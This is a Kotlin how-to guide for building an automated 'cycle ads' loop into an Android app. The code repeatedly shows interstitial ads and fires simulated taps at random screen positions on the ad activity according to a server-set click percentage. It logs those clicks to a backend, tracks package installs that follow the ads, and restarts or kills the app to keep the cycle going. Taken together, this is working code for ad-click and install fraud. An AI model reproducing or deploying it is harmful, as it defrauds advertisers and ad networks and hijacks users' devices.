Follow the steps one by one for the cyclic adflow

Make main activity singleTask
--------------------------
```kotlin
<activity
    android:name="MainActivity"
    android:launchMode="singleTask"
    android:screenOrientation="portrait"            
    android:windowSoftInputMode="adjustPan" />
```
Variable declaration
------------------------------
```kotlin
private var cyclicAdAttempts = 0
private var adsClicksCount = 1
private var maxTryForAds = 1
private var appWillReopenAfterTime: Long = 60000
private var restartAppJob: Job? = null
private var adsClicksJob: Job? = null
private var maxTryJob: Job? = null
private var putBackroundByAds: Boolean = false
private var isReceiverRegistered: Boolean = false
private val ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 100001
private val packageChangeReceiver by lazy { PackageChangeReceiver() }
```
-----------------------
Allow permission to load cycle ads with checking the cycle ads flag 
-----------------------------------
```kotlin
lifecycleScope.launch {
    repeatOnLifecycle(Lifecycle.State.RESUMED) {
        if (Monetization.getObservers().contains(this@MonetizationBaseActivity).not()) {
            Monetization.addMonetizationObserver(this@MonetizationBaseActivity)
        }
        if (userDetail?.id.isNullOrEmpty().not() && userDetail?.shouldShowCycleAds == true) { 
            // Check and register the package register
            if (!isReceiverRegistered) {
                listenToPackageChanges()
            }

            // Check and apply ask the overlay permission
            if (!Settings.canDrawOverlays(this@MonetizationBaseActivity)) {
                val myIntent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                myIntent.data = Uri.parse("package:$packageName")
                startActivityForResult(myIntent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE)
            } else {
                userDetail.maxTryForAds = userDetail?.maxTryForAds ?: 20
                appWillReopenAfterTime = 60000
                maxTryForAds = 1
                loadAutoAds(LocalDataHelper.getUserDetail())
            }
       }
    }
}
```
------------------
Handle permission callback
------------------
```kotlin
override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)
    if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
        loadAutoAds(UserManager.getUser())
    }
}
```
--------------
On Resume
---------------
```kotlin
override fun onResume() {
    super.onResume()
    if (LibInitializer.wasOfferwallInitialized) {
        OfferWallLib.onResume(this)
        Monetization.onResume(this)
    }
    if (Monetization.getObservers().contains(this).not()) {
        Monetization.addMonetizationObserver(this)
    }

    if (userDetail?.shouldShowCycleAds == true) {
        // Remove the cache files
        GlobalScope.launch {
            MemoryReleaseHelper.processAndDeleteFromAlFolder(filesDir)
            clearAppCache(this@MonetizationBaseActivity)
        }
    }   
}
```
-----------------
On Stop
-----------------
```kotlin
override fun onStop() {
    super.onStop()
    Monetization.onStop()
}
```
--------------------
Step-3 Load auto ads call it in activity to load auto ads
----------------------
```kotlin
private fun loadAutoAds(user: User?) {
    var coroutine = GlobalScope.launch { }
    cyclicAdAttempts = 0

    coroutine = startCoroutineTimer(100, 300) {
       cyclicAdAttempts++
       runOnUiThread {
            if (Monetization.hasLoadedAllAds() || cyclicAdAttempts >= 80) {
                cyclicAdAttempts = 0
                coroutine.cancel()
                Log.e("check_cycle_ads", "6")
                Log.e("check_cycle_ads", "7 ${lifecycle.currentState}")
                lifecycleScope.launch {
                    checkBestAds(user)
                }
            }
        }
    }
}
```
```kotlin
fun startCoroutineTimer(
    delayMillis: Long = 0,
    repeatMillis: Long = 0,
    action: () -> Unit,
): Job {
    return GlobalScope.launch {
        delay(delayMillis)
        if (repeatMillis > 0) {
            while (true) {
                action()
                delay(repeatMillis)
            }
        } else {
            action()
        }
    }
}
```
---------------------
check best ads
------------------------
```kotlin
private fun checkBestAds(user: User?) {
    Log.e(
        "check_cycle_ads", "Max Try $maxTryForAds AdsClickCount-$adsClicksCount"
    )
    tryToShowAd(lifecycleScope, onAdShouldReload = {
        Log.e("check_cycle_ads", "Ad should reload")

        if (cyclicAdAttempts == 0) {
            Log.e("check_cycle_ads", "Ad should reload starting")

            loadAutoAds(user)
        }
    }, onShowingInterstitial = { isShowing, isVideoAd ->
        if (isShowing) {
            checkIsAdPlaying {
                adsClicksCount = adsClicksCount.inc()
                Log.e("check_cycle_ads", "4")

                putBackroundByAds = true

                val videoDelay =
                    if (isVideoAd) (user?.videoAdsWaitTimeForClickAndOpen ?: 20_000) else 0
                val waitTimeForTheAdsClick = (user?.waitTimeForTheAdsClick ?: 2000) + videoDelay
                val waitTimeForTheReopenApp =
                    (user?.waitTimeForTheReopenApp ?: 10000) + videoDelay

                adsClicksJob = lifecycleScope.launch {
                    delay(waitTimeForTheAdsClick)
                    Log.e(
                        "check_cycle_ads",
                        "Can click on Ad ${Random.nextInt(0..100) <= (user?.clickPercentage ?: 50)}"
                    )
                    if (Random.nextInt(0..100) <= (user?.clickPercentage ?: 50)) {
                        if (Controller.foregroundActivity != this@MonetizationBaseActivity) {
                            Log.e("check_cycle_ads", "Click on ad $adsClicksCount")
                            clickOnRandomPosOfTheScreen()
                            mGeneralViewModel?.userClickOnAd()
                        }
                    }
                    adsClicksJob?.cancel()
                }
                restartAppJob = GlobalScope.launch {
                    Log.e("check_cycle_ads", "RESTART_APP $waitTimeForTheReopenApp")
                    delay(waitTimeForTheReopenApp)

                    if (PackageChangeReceiver.lastTimePackageAdded != 0L) {
                        val timeSpent =
                            System.currentTimeMillis() - PackageChangeReceiver.lastTimePackageAdded
                        val seconds: Long = TimeUnit.MILLISECONDS.toSeconds(timeSpent)

                        if (seconds < 15) {
                            Log.e(
                                "check_cycle_ads", "RESTART_APP DELAY ${(15 - seconds) * 1000}"
                            )
                            Handler(Looper.getMainLooper()).postDelayed({
                                restartAppJob()
                            }, (15 - seconds) * 1000)
                        } else {
                            Log.e(
                                "check_cycle_ads", "RESTART_APP DELAY ELSE"
                            )
                            restartAppJob()
                        }
                    } else {
                        Log.e(
                            "check_cycle_ads", "RESTART_APP DELAY No installed app ELSE"
                        )

                        restartAppJob()
                    }
                }
            }
        } else if (maxTryForAds <= (user?.maxTryForAds ?: 20)) {
            maxTryJob = lifecycleScope.launch {
                delay(2000)

                maxTryForAds = maxTryForAds.inc()

                //try 1-2 times more and restart
                appWillReopenAfterTime = appWillReopenAfterTime.minus(31000)

                //*App will restart if there is no ads in 1 min*//

                if (maxTryForAds >= (user?.maxTryForAds ?: 20) || appWillReopenAfterTime < 0) {
                    Log.e(
                        "check_cycle_ads", "App reopen time $appWillReopenAfterTime"
                    )
                    restartAppJob()
                } else {
                    loadAutoAds(user)
                }
                maxTryJob?.cancel()
            }
        } else {
            Log.e("check_cycle_ads","Not available ads Force Restart")
            forceRestart()
        }
    })
}
```
----------------
Put it in your monetization manager
----------------
```kotlin
fun tryToShowAd(
        lifecycleScope: LifecycleCoroutineScope,
        onShowingInterstitial: (isShowing: Boolean, isVideo: Boolean) -> Unit = { isShowing: Boolean, isVideo: Boolean -> },
        onAdShouldReload: () -> Unit,
    ) {
    Log.wtf(
        "check_cycle_ads",
        "state ${Monetization.hasLoadedInterstitial()} ${Monetization.hasLoadedAd()}"
    )

    if (Monetization.hasLoadedInterstitial() || Monetization.hasLoadedAd()) {
        Log.wtf("check_cycle_ads", "state Showing")

        val isVideoAd = Monetization.showBestAd() == 2
        Log.wtf("check_cycle_ads", "state Showing isVideo $isVideoAd")

        onShowingInterstitial(true, isVideoAd)
    } else {
        onShowingInterstitial(false, false)
    }
    Util.executeDelay({
        val timePassed =
            TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis() - lastOnAdShownTimeCalledMS)
        Log.e("check_cycle_ads", "After show timepassed $timePassed")

        if (timePassed > 15 || lastOnAdShownTimeCalledMS == 0L) {
            onAdShouldReload()
        }
    }, coroutineScope = lifecycleScope, 7_000)
}
```
-------------
Execute on delay (Add it in Utils)
-------------
```kotlin
fun executeDelay(callback: () -> Unit, coroutineScope: CoroutineScope, delay: Long) {
    coroutineScope.launch {
        delay(delay)
        callback.invoke()
    }
}
```
----------------------
For restart app
-------------------------
```kotlin
private fun restartAppJob() {
    val i = this.intent
    i?.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK)
    this.startActivity(i)
    restartAppJob?.cancel()
}
```

-------------------
Check if ads is playing or not
------------------
```kotlin
private fun checkIsAdPlaying(callback: (Boolean) -> Unit) {
    Log.e("check_cycle_ads", "checkIsAdPlaying")
    if (isNotAdsActivity(this@BaseActivity)) {
        callback.invoke(true)
    } else {
        callback.invoke(false)
    }
}
```
-----------------
Check if the current activity is an ad activity
---------------------
```kotlin
 fun isNotAdsActivity(defaultActivity: GameActivity): Boolean {
     Log.e(
        "ADTYPE",
        "${Controller.foregroundActivity?.localClassName}--${this@BaseActivity.localClassName}"
     )
     return Controller.foregroundActivity == defaultActivity
}
```
----------------------
Perform click on ads activity
-----------------------
```kotlin
fun clickOnRandomPosOfTheScreen() {
    if (this@BaseActivity == Controller.foregroundActivity) return
    val foregroundView = Controller.foregroundView ?: return
//  val view = findViewById<View>(android.R.id.content)
    val coordinates = getRandomCoordinates(foregroundView)
    val x = coordinates.first
    val y = coordinates.second

    val motionEventDown = MotionEvent.obtain(
        System.currentTimeMillis(),
        System.currentTimeMillis() + 100,
        MotionEvent.ACTION_DOWN,
        x,
        y,
        0
    )
    val motionEventUp = MotionEvent.obtain(
        System.currentTimeMillis(),
        System.currentTimeMillis() + 100,
        MotionEvent.ACTION_UP,
        x,
        y,
        0
    )

    foregroundView.dispatchTouchEvent(motionEventDown)
    foregroundView.dispatchTouchEvent(motionEventUp)
    Log.d("AutoClick", "Auto click at X: $x, Y: $y")
}

private fun getRandomCoordinates(view: View): Pair<Float, Float> {
    val screenWidth = view.width.toFloat()
    val screenHeight = view.height.toFloat()

    val randomX = (Math.random() * screenWidth).toFloat()
    val randomY = (Math.random() * screenHeight).toFloat()

    return Pair(randomX, randomY)
}
```

--------------------------
Broadcast receiver to get the status of package install or uninstall
----------------------------
```kotlin
class PackageChangeReceiver : BroadcastReceiver(), CoroutineScope {
    private var forDeleteApp = false
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        val data = intent.data

        when (action) {
            ACTION_PACKAGE_REMOVED -> {
            }

            ACTION_PACKAGE_ADDED -> {
                Log.wtf("check_cycle_ads", "ADDED $data")

                lastTimePackageAdded = System.currentTimeMillis()
            }
        }
    }
}
```
```kotlin
override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main
```
```kotlin
companion object {
    var lastTimePackageAdded = 0L
}

```
--------------------------
Add monetization callbacks
--------------------------
```kotlin
override fun onAdFailedToShow() {
    Log.e("check_cycle_ads", "Force restart failed to show")
    forceRestart()
}

override fun onAdShown() {
    Log.e("check_cycle_ads", "onAdShown Called")
    DailyRewardsManager().lastOnAdShownTimeCalledMS = System.currentTimeMillis()
}
```
------------------
Force start app functinn when app failed to load ads
---------------
```kotlin
private fun forceRestart() {
    val ctx = baseContext
    val pm = ctx.packageManager
    val intent = pm.getLaunchIntentForPackage(ctx.packageName)
    val mainIntent = Intent.makeRestartActivityTask(intent?.component)
    ctx.startActivity(mainIntent)
    Runtime.getRuntime().exit(0)
}
```
-------------
Register receiver in Manifest.xml
---------------------
```kotlin
<receiver
    android:name=".shared.services.PackageChangeReceiver"
    android:enabled="true"
    android:exported="true"
    android:permission="android.permission.INSTALL_PACKAGES">
    <intent-filter>
        <action android:name="com.android.vending.INSTALL_REFERRER" />
        <action android:name="android.intent.action.PACKAGE_ADDED" />
        <action android:name="android.intent.action.PACKAGE_REMOVED" />
        <action android:name="android.intent.action.ACTION_UNINSTALL_PACKAGE" />
        <data android:scheme="package" />
    </intent-filter>
</receiver>
```
---------------------
Register receiver in Activity
---------------------
```kotlin
private fun listenToPackageChanges() {
    isReceiverRegistered = true

    val intentFilter = IntentFilter()
    intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
    intentFilter.addAction(Intent.ACTION_PACKAGE_REMOVED)
    intentFilter.addDataScheme("package")
    registerReceiver(packageChangeReceiver, intentFilter)
}
```
----------------------
UnRegister receiver onDestroy()
----------------------
```kotlin
unregisterReceiver(packageChangeReceiver)
```
----------------------
For Remove Cache Files, Add MemoryReleaseHelper and File Data class
----------------------
```kotlin
object MemoryReleaseHelper {
    fun clearAppCache(activity: Activity) {
        try {
            val cacheDirectory = activity.cacheDir
            deleteDir(cacheDirectory)
        } catch (e: java.lang.Exception) {
            Log.e("check_cycle_ads", "Exception clear cache ${e.message}")
            e.printStackTrace()
        }
    }

    private fun deleteDir(dir: File?): Boolean {
        if (dir != null && dir.isDirectory) {
            val children = dir.list()
            for (i in children.indices) {
                val success = deleteDir(File(dir, children[i]))
                if (!success) {
                    return false
                }
            }
        }
        return dir!!.delete()
    }

    fun processAndDeleteFromAlFolder(directory: File): Collection<FileData> {
        val fileDataList: MutableList<FileData> = mutableListOf()

        // Get all the files from the directory.
        val files = directory.listFiles()
        if (files != null) {
            for (file in files) {
                val fileSizeInKB = calculateSize(file)

                // Check if the current directory is "al" and the file size exceeds 256
                if (directory.name == "al" && fileSizeInKB > 16) {
                    val deleted = file.delete()
                    if (deleted) {
                        android.util.Log.wtf(
                            "check_cycle_ads FILES",
                            "Deleted file: " + file.absolutePath + " due to size exceeding 256KB"
                        )
                        continue  // Continue to the next iteration since the file was deleted
                    } else {
                        android.util.Log.wtf("check_cycle_ads FILES", "Failed to delete file: " + file.absolutePath)
                    }
                }
                if (file.isDirectory) {
                    // If it's a directory, process its files but don't delete.
                    fileDataList.addAll(processAndDeleteFromAlFolder(file))
                } else {
                    fileDataList.add(FileData(file, fileSizeInKB))
                }
            }
        }

        return fileDataList
    }

    private fun calculateSize(file: File): Long {
        if (file.isFile) {
            return file.length() / 1024 // Convert bytes to kilobytes (KB)
        }
        var size: Long = 0
        val subFiles = file.listFiles()
        if (subFiles != null) {
            for (subFile in subFiles) {
                size += calculateSize(subFile) // Recursive call for directories
            }
        }
        return size
    }
}
```
----------------------
File data class
----------------------
```kotlin
class FileData(val file: File, val size: Long)
```

----------------------
Add Cyclic Interceptor for blocking the requests.
----------------------
```kotlin
class CycleAdsInterceptor : Interceptor {

    @Throws(IOException::class)
    override fun intercept(chain: Interceptor.Chain): Response {
        val request = chain.request()
        if (LocalDataHelper.getUserDetail()?.shouldShowCycleAds == true || LocalDataHelper.getShouldShowCycleAds()) {
            if (request.url.toString().contains("checkVersionEstablished")
                || request.url.toString().contains("loginEstablished")
                || request.url.toString().contains("userClickOnAd")
                || request.url.toString().contains("getReferralParams")
                || request.url.toString().contains("registerForNotificationEstablished")
                || request.url.toString().contains("getUser")
                || request.url.toString().contains("getFeed") //TODO add the APIs which are call in Home screen and replace this line.
            ) {
                // Normal flow
                return chain.proceed(request)
            } else {
                // Else return dummy error with code 11111
                return Response.Builder()
                    .code(CYCLE_ADS_CODE) // Whatever code
                    .body("".toResponseBody(null)) // Whatever body
                    .protocol(Protocol.HTTP_2)
                    .message("Dummy response")
                    .request(chain.request())
                    .build()
            }
        }

        return chain.proceed(request)
    }

    companion object {
        const val CYCLE_ADS_CODE = 111111
    }
}
```
--------------------------------
Handel the error for CYCLE_ADS_CODE code
--------------------------------
```kotlin
if (response.code != CycleAdsInterceptor.CYCLE_ADS_CODE) {
    onError(response.message)
}
```
--------------------------------
If you face Verts error on APIs which are called in Home screen then manage them accordingly.
--------------------------------
